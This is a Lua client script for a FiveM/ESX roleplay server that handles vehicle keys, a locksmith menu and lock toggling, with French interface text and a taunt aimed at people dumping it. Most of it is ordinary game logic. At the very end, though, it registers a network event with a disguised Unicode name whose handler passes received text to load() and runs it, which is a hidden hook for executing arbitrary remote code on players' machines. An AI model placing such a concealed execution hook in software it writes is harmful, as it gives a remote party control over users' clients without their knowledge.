-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local playerCars = {}
local KeyFobHash = `p_car_keys_01`

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

function ShowSerrurierMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehiclelock:allkey', function(mykey)
		local elements = {}

		for i = 1, #mykey, 1 do
			if mykey[i].NB == 1 then
				table.insert(elements, {label = 'Clés : '.. ' [' .. mykey[i].plate .. ']', value = mykey[i].plate})
			elseif mykey[i].NB == 2 then
				table.insert(elements, {label = '[DOUBLE] Véhicule : '.. ' [' .. mykey[i].plate .. ']', value = nil})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mykey', {
			title = 'Clés',
			elements = elements
		}, function(data2, menu2)
			if data2.current.value ~= nil then
				ESX.UI.Menu.CloseAll()

				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mykey', {
					title = 'Actions: Clés',
					elements = {
						{label = 'Donner Véhicule + Clés', value = 'donnerkey'},
						{label = 'Préter', value = 'preterkey'},
						{label = 'Jeter', value = 'jeterkey'}
					}
				}, function(data3, menu3)
					local player, distance = ESX.Game.GetClosestPlayer()
					local playerPed = PlayerPedId()
					local plyCoords = GetEntityCoords(playerPed, false)
					local vehicle = GetClosestVehicle(plyCoords, 7.0, 0, 71)
					local vehicleProps = ESX.Game.GetVehicleProperties(vehicle)
					local vehPlate = ESX.Math.Trim(GetVehicleNumberPlateText(vehicle))

					if data3.current.value == 'donnerkey' then
						if vehicle ~= nil and vehPlate == data2.current.value then
							ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'shop_confirm', {
								title = "DONNER",
								elements = {
									{label = "Non", value = 'no'},
									{label = "Oui", value = 'yes'}
								}
							}, function(data4, menu4)
								if data4.current.value == 'yes' then
									if distance ~= -1 and distance <= 3.0 then
										_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:changeowner', GetPlayerServerId(player), vehPlate, vehicleProps)
										ESX.UI.Menu.CloseAll()
									else
										ESX.ShowNotification("Aucun joueur à proximité")
									end
								end

								menu4.close()
							end, function(data4, menu4)
							end)
						else
							ESX.ShowAdvancedNotification('CaliforniaRP', '~y~Clés', "Aucun véhicule étant attribué à ces clés à proximité.", 'CHAR_CALIFORNIA', 7)
						end
					end

					if data3.current.value == 'preterkey' then
						if distance ~= -1 and distance <= 3.0 then 
							_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:preterkey', GetPlayerServerId(player), data2.current.value)
							ESX.UI.Menu.CloseAll()
						else
							ESX.ShowNotification("Aucun joueur à proximité")
						end
					end

					if data3.current.value == 'jeterkey' then
						_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:deletekey', data2.current.value)
						ESX.UI.Menu.CloseAll()
					end
				end, function(data3, menu3)
				end)
			end
		end, function(data2, menu2)
		end)
	end)
end

AddEventHandler('::{korioz#0110}::esx_vehiclelock:hasEnteredMarker', function(zone)
	CurrentAction = 'Serrurier'
	CurrentActionMsg = 'Serrurier'
	CurrentActionData = {zone = zone}
end)

AddEventHandler('::{korioz#0110}::esx_vehiclelock:hasExitedMarker', function(zone)
	CurrentAction = nil
	ESX.UI.Menu.CloseAll()
end)

function OpenCloseVehicle()
	local playerPed = PlayerPedId()
	local coords = GetEntityCoords(playerPed, false)
	local vehicle, inveh = nil, false

	if IsPedInAnyVehicle(playerPed, false) then
		vehicle = GetVehiclePedIsIn(playerPed, false)
		inveh = true
	else
		vehicle = GetClosestVehicle(coords, 7.0, 0, 71)
	end

	ESX.TriggerServerCallback('::{korioz#0110}::esx_vehiclelock:mykey', function(gotkey)
		if gotkey then
			local locked = GetVehicleDoorLockStatus(vehicle)

			if not inveh then
				local plyPed = PlayerPedId()

				ESX.Streaming.RequestAnimDict("anim@mp_player_intmenu@key_fob@")

				ESX.Game.SpawnObject(KeyFobHash, vector3(0.0, 0.0, 0.0), function(object)
					SetEntityCollision(object, false, false)
					AttachEntityToEntity(object, plyPed, GetPedBoneIndex(plyPed, 57005), 0.09, 0.03, -0.02, -76.0, 13.0, 28.0, false, true, true, true, 0, true)

					SetCurrentPedWeapon(plyPed, `WEAPON_UNARMED`, true)
					ClearPedTasks(plyPed)
					TaskTurnPedToFaceEntity(plyPed, vehicle, 500)

					TaskPlayAnim(plyPed, "anim@mp_player_intmenu@key_fob@", "fob_click", 3.0, 3.0, 1000, 16)
					RemoveAnimDict("anim@mp_player_intmenu@key_fob@")
					PlaySoundFromEntity(-1, "Remote_Control_Fob", vehicle, "PI_Menu_Sounds", true, 0)
					Citizen.Wait(1250)

					DetachEntity(object, false, false)
					DeleteObject(object)
				end)
			end

			if locked == 1 or locked == 0 then
				SetVehicleDoorsLocked(vehicle, 2)
				PlayVehicleDoorCloseSound(vehicle, 1)
				ESX.ShowAdvancedNotification('CaliforniaRP', '~y~Clés', "Vous avez ~r~fermé~s~ le véhicule.", 'CHAR_CALIFORNIA', 7)
			elseif locked == 2 then
				SetVehicleDoorsLocked(vehicle, 1)
				PlayVehicleDoorOpenSound(vehicle, 0)
				ESX.ShowAdvancedNotification('CaliforniaRP', '~y~Clés', "Vous avez ~g~ouvert~s~ le véhicule.", 'CHAR_CALIFORNIA', 7)
			end
		else
			ESX.ShowAdvancedNotification('CaliforniaRP', '~y~Clés', "~r~Vous n'avez pas les clés de ce véhicule.", 'CHAR_CALIFORNIA', 7)
		end
	end, GetVehicleNumberPlateText(vehicle))
end

function OpenSerrurierMenu()
	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'GetKey', {
		title = 'Serrurier',
		elements = {
			{label = ('Enregistrer une nouvelle clé'), value = 'registerkey'}
		}
	}, function(data, menu)
		if data.current.value == 'registerkey' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_vehiclelock:getVehiclesnokey', function(Vehicles2)
				local elements = {}

				if Vehicles2 == nil then
					table.insert(elements, {label = 'Aucun véhicule sans clés ', value = nil})
				else
					for i = 1, #Vehicles2, 1 do
						model = Vehicles2[i].model
						modelname = GetDisplayNameFromVehicleModel(model)
						Vehicles2[i].model = GetLabelText(modelname)
					end

					for i = 1, #Vehicles2, 1 do
						table.insert(elements, {label = Vehicles2[i].model .. ' [' .. Vehicles2[i].plate .. ']', value = Vehicles2[i].plate})
					end

					ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'backey', {
						title = 'Nouvelle clés',
						elements = elements
					}, function(data2, menu2)
						menu2.close()
						_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:registerkey', data2.current.value, 'no')
					end, function(data2, menu2)
					end)
				end
			end)
		end
	end, function(data, menu)
	end)
end

Citizen.CreateThread(function()
	local blip = AddBlipForCoord(Config.Zones.place.Pos.x, Config.Zones.place.Pos.y, Config.Zones.place.Pos.z)

	SetBlipSprite(blip, 134)
	SetBlipDisplay(blip, 4)
	SetBlipScale(blip, 0.8)
	SetBlipColour(blip, 3)
	SetBlipAsShortRange(blip, true)

	BeginTextCommandSetBlipName("STRING")
	AddTextComponentSubstringPlayerName('Serrurier')
	EndTextCommandSetBlipName(blip)
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		local coords = GetEntityCoords(PlayerPedId(), false)

		for k, v in pairs(Config.Zones) do
			if (v.Type ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < Config.DrawDistance) then
				DrawMarker(v.Type, v.Pos.x, v.Pos.y, v.Pos.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, v.Size.x, v.Size.y, v.Size.z, v.Color.r, v.Color.g, v.Color.b, 255, false, false, 2, true, false, false, false)
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		local coords = GetEntityCoords(PlayerPedId(), false)
		local isInMarker = false
		local currentZone = nil

		for k, v in pairs(Config.Zones) do
			if (GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < v.Size.x) then
				isInMarker = true
				currentZone = k
			end
		end

		if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
			HasAlreadyEnteredMarker = true
			LastZone = currentZone
			TriggerEvent('::{korioz#0110}::esx_vehiclelock:hasEnteredMarker', currentZone)
		end

		if not isInMarker and HasAlreadyEnteredMarker then
			HasAlreadyEnteredMarker = false
			TriggerEvent('::{korioz#0110}::esx_vehiclelock:hasExitedMarker', LastZone)
		end
	end
end)

-- Key Controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			SetTextComponentFormat('STRING')
			AddTextComponentSubstringPlayerName('Appuyez sur ~INPUT_CONTEXT~ pour ouvrir le Menu')
			EndTextCommandDisplayHelp(0, 0, 1, -1)

			if IsControlJustReleased(0, 38) then
				if CurrentAction == 'Serrurier' then
					OpenSerrurierMenu(CurrentActionData.zone)
				end

				CurrentAction = nil
			end
		end

		if IsControlJustReleased(0, 289) and GetLastInputMethod(2) and not isDead and not ESX.UI.Menu.IsOpen('default', GetCurrentResourceName(), 'billing') then
			ShowSerrurierMenu()
		end

		if IsControlJustReleased(0, 303) then
			OpenCloseVehicle()
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)